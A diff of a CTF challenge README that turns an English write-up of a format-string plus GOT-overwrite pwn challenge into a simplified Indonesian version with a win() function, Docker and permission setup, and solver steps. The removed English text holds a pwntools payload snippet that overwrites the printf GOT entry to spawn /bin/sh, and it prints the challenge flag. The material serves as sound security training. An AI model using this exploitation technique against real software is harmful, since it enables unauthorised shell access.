@@ -1,185 +1,103 @@
 # Ethack_Tk1
 
-## fmt-got — Format String + GOT-Overwrite CTF Challenge
+## easy-fmt-got (versi disederhanakan)
 
-A self-contained pwn challenge that teaches the classic **format-string
-vulnerability** combined with a **GOT (Global Offset Table) overwrite**
-under **Partial RELRO**.
+Challenge ini dibuat lebih mudah untuk latihan dasar:
+1. `chall` punya format-string bug (`printf(buf)`) untuk overwrite `printf@GOT` ke `win()`.
+2. `win()` langsung menjalankan `/bin/sh`.
+3. Di shell, jalankan `./flag`, lalu kirim `%s` (atau `%1$s`) untuk leak flag yang disimpan sebagai variabel global.
 
----
+## Struktur folder
 
-### Challenge Summary
-
-| Property | Value |
-|---|---|
-| Category | pwn |
-| Technique | Format-string write → GOT overwrite |
-| Binary protections | Partial RELRO · No PIE · No stack canary · NX |
-| Port | 3012 |
-
-The binary leaks `system()` at startup so participants can focus on the
-format-string write primitive.  The goal is to overwrite the `printf` GOT
-entry with `system`, then send `"/bin/sh"` to spawn a shell.  Inside that
-shell, run `./flag` (an SUID binary) to print the flag.
-
----
-
-### Directory Layout
-
-```
+```text
 challenge/
-├── Dockerfile   – builds and serves the challenge on port 3012
-├── chall.c      – vulnerable binary source
-├── flag.c       – SUID flag-printer source
-└── solve.py     – pwntools exploit (reference solver)
+├── Dockerfile
+├── chall.c
+├── flag.c
+└── solve.py
 ```
 
----
+## Opsi 1: Setup lokal pakai Docker (disarankan)
 
-### Building & Running (Docker)
+```bash
+cd challenge
+docker build -t easy-fmt-got .
+docker run --rm -p 3012:3012 easy-fmt-got
+```
+
+Service challenge akan listen di `localhost:3012`.
+
+## Opsi 2: Setup lokal tanpa Docker (Linux/WSL)
+
+> Untuk Windows native, gunakan WSL agar `gcc/chmod/chown` dan permission Unix bekerja normal.
 
 ```bash
 cd challenge
 
-# Build the image
-docker build -t fmt-got .
+# compile chall (sesuai proteksi challenge)
+gcc -o chall chall.c -no-pie -Wl,-z,relro -fno-stack-protector
 
-# Run locally on port 3012
-docker run -p 3012:3012 --rm fmt-got
+# compile flag helper
+gcc -o flag flag.c
 ```
 
-> **Tip:** If you want to play the challenge locally without Docker, compile
-> `chall.c` with the same flags used in the Dockerfile:
->
-> ```bash
-> gcc -o chall chall.c -no-pie -Wl,-z,relro -fno-stack-protector
-> ```
+### Manajemen permission yang direkomendasikan
 
----
-
-### Extracting the Binary (for local analysis)
-
-Participants typically receive the compiled binary so they can perform offline
-analysis (checksec, objdump, patchelf, …).  Copy it out of a running container:
+Jalankan sebagai root (atau pakai `sudo`):
 
 ```bash
-# start a temporary container
-CID=$(docker run -d fmt-got)
+cd challenge
+chown root:ctf chall
+chmod 755 chall
 
-# copy the binary
-docker cp "$CID":/challenge/chall ./chall
-
-# stop the container
-docker stop "$CID"
+chown root:root flag
+chmod 111 flag
 ```
 
-If the remote server runs a different libc than your local machine you can
-patch the binary with **patchelf**:
+Arti permission:
+1. `chall` dengan `755`: bisa dieksekusi user biasa.
+2. `flag` dengan `111`: execute-only (tidak ada read bit), jadi tidak bisa dibuka/di-cat oleh user biasa.
+
+Verifikasi:
 
 ```bash
-# extract the container's libc and linker
-docker cp "$CID":/lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6
-docker cp "$CID":/lib64/ld-linux-x86-64.so.2    ./ld-linux-x86-64.so.2
-
-patchelf --set-interpreter ./ld-linux-x86-64.so.2 \
-         --replace-needed  libc.so.6 ./libc.so.6 \
-         chall
-mv chall chall_patched
+ls -l chall flag
 ```
 
-Then point `solve.py` at `./chall_patched`.
+Output minimal yang diharapkan:
+1. `chall` terlihat seperti `-rwxr-xr-x`
+2. `flag` terlihat seperti `---x--x--x`
 
----
+## Cara menjalankan solver
 
-### Binary Protections (checksec)
-
-```
-    Arch:       amd64-64-little
-    RELRO:      Partial RELRO    ← GOT is writable ✓
-    Stack:      No canary found
-    NX:         NX enabled
-    PIE:        No PIE           ← fixed base address ✓
-```
-
----
-
-### Solution Walk-through
-
-#### 1. Receive the system() leak
-
-The binary prints the runtime address of `system()`:
-
-```
-Gift for you: 0x7f1234567890
-```
-
-#### 2. Overwrite printf GOT → system
-
-The `printf(buf)` call is a classic format-string sink.  Using pwntools'
-`fmtstr_payload` at offset **6** we write the leaked `system()` address into
-`printf`'s GOT entry.
-
-```python
-from pwn import *
-
-exe = ELF("./chall")
-printf_got  = exe.got["printf"]   # fixed (no PIE)
-system_addr = <leaked value>
-
-payload = fmtstr_payload(6, {printf_got: system_addr}, write_size="short")
-r.sendline(payload)
-```
-
-> **Finding the offset** – If you need to verify or adjust the offset, use
-> `fmtstr_find_offset` or the `find_offset()` helper in `solve.py`.
-
-#### 3. Spawn a shell
-
-After the GOT overwrite, every subsequent call to `printf(buf)` is really
-`system(buf)`.  Send `"/bin/sh\0"` to open an interactive shell:
-
-```python
-r.sendline(b"/bin/sh")
-r.interactive()
-```
-
-#### 4. Read the flag
-
-Inside the shell:
-
-```bash
-$ ./flag
-Now where were we?
-CTF{f0rm4t_str1ng_g0t_wr1t3_4nd_sh3ll_3sc4p3}
-```
-
-The `flag` binary is **SUID root** and reads `/flag.txt` (which is mode
-`0400`, readable only by root), so regular users on the remote machine cannot
-cat the flag directly—they must go through the exploit.
-
----
-
-### Running the Solver
+Install dependency:
 
 ```bash
 pip install pwntools
+```
 
-# against the Docker container running on localhost:3012
+Jalankan solver terhadap service Docker (localhost:3012):
+
+```bash
 python3 challenge/solve.py
+```
 
-# local process (no network)
+Atau local process langsung:
+
+```bash
 python3 challenge/solve.py LOCAL
-
-# local process with GDB attached
 python3 challenge/solve.py LOCAL DEBUG
 ```
 
----
+## Alur solve singkat
 
-### Flag
+1. Solver overwrite `printf@GOT` ke `win()`.
+2. Kirim input trigger untuk mengeksekusi `win()` dan mendapatkan shell.
+3. Jalankan `./flag`.
+4. Kirim `%1$s` untuk mencetak string flag dari argumen pertama `printf`.
 
-```
-CTF{f0rm4t_str1ng_g0t_wr1t3_4nd_sh3ll_3sc4p3}
-```
+## Troubleshooting permission
 
-*(Change this in the Dockerfile before deploying to a real event.)*
+1. Jika `./flag: Permission denied`, cek lagi `chmod 111 flag`.
+2. Jika `chown` gagal, jalankan dengan `sudo` atau root.
+3. Jika setup di Windows CMD/PowerShell native, pindah ke WSL atau Docker agar semantics permission Unix tidak bermasalah.
